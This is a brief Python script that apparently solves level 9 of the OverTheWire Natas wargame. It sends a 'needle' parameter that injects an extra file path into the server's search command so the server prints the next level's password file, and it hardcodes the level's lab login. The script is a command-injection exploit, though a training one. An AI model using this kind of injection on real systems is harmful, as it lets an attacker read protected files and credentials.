import requests as req
from requests.auth import HTTPBasicAuth


needle = '"" /etc/natas_webpass/natas10'
# needle = '"" /etc/natas_webpass/natas17'
LOGIN = 'http://natas9.natas.labs.overthewire.org'
payload = {'needle':needle} 
r = req.post(LOGIN, auth=HTTPBasicAuth('natas9',
    'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'), data=payload)

print (r.content)
